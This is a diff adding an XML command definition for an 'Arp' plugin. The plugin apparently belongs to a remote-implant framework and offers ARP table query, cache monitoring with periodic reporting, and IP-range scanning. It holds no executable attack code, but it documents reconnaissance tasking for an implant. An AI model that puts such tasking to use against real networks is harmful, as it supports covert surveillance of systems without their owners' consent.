@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+
+<Plugin providerName='Tasking/Mcl_Cmd_Arp_Tasking.pyo' providerType='script'>
+
+	<Command name="Arp" id="0">
+		<Help>Displays information regarding the address resolution protocol.</Help>
+		
+		<Input>
+			<Option name='query' optional='false' group='instruction'>
+				<Set data='instruction' value='1' />
+				<Help>Print the IP-to-Physical address translation table used by ARP</Help>
+				<Help>Options: None</Help>
+			</Option>
+			
+			<Option name='monitor' optional='false' group='instruction'>
+				<Set data='instruction' value='2' />
+				<Help>Like -query but continuously checks the cache and displays additions to the table</Help>
+				<Help>Options: -delay, -entries, -sendInterval</Help>
+			</Option>
+			
+			<Option name='scan' optional='false' group='instruction'>
+				<Set data='instruction' value='3' />
+				<Help>Send ARP packets for the supplied range of IP addresses</Help>
+				<Help>Options: -delay</Help>
+				
+				<Argument name="start_ip" data="startIp" optional="false" />
+				<Argument name="end_ip" data="endIp" optional="true" />
+			</Option>
+			
+			<Option name="delay" optional="true">
+				<Help>When using -scan, delay between ARPs.</Help>
+				<Help>When using -monitor, delay to specify sleep time for implant before rechecking the ARP cache</Help>
+				<Argument name="value" data="delay" />
+			</Option>
+			
+			<Option name="entries" optional="true">
+				<Help>The number of entries initially stored in memory, and the amount to allocate if additional entries are found (used for monitor).</Help>
+				<Argument name="ARP Cache Entries" data="entries" />
+			</Option>
+			
+			<Option name="sendInterval" optional="true">
+				<Help>Interval to send cache entries, in multiples of the delay time (used in monitor).</Help>
+				<Argument name="delay multiple" data="sendInterval" />
+			</Option>
+		</Input>
+		
+		<Output>
+			<Data name='instruction' type='uint8_t' default='0' />
+			<Data name='delay' type='time' default="2s" />
+			<Data name="entries" type="uint8_t" default="100" />
+			<Data name="sendInterval" type="uint8_t" default="0" />
+			<Data name="startIp" type="ipaddr" default="255.255.255.255"/>
+			<Data name="endIp" type="ipaddr"/>
+		</Output>
+		
+	</Command>
+</Plugin>
